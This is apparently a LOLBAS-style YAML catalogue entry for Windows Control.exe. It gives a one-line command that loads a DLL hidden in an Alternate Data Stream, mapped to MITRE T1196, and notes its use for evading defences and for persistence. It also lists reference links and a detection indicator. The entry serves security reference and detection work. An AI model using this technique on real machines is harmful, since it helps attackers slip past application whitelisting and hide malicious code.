---
name: Control.exe
description: Binary used to launch controlpanel items in Windows
functions:
  ads:
    - description: Execute evil.dll which is stored in an Alternate Data Stream (ADS).
      code: control.exe c:\windows\tasks\file.txt:evil.dll
      mitreid: T1196
      mitrelink: https://attack.mitre.org/wiki/Technique/T1196
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
resources:
    - resource: https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
    - resource: https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/
    - resource: https://twitter.com/bohops/status/955659561008017409
    - resource: https://docs.microsoft.com/en-us/windows/desktop/shell/executing-control-panel-items
    - resource: https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/
fullpath:
    - path: C:\Windows\System32\control.exe
    - path: C:\Windows\SysWOW64\control.exe
detection:
  - IOC: Control.exe executing files from alternate data streams.
acknowledgement:
  - Person: Jimmy
    Handle: '@bohops'
---
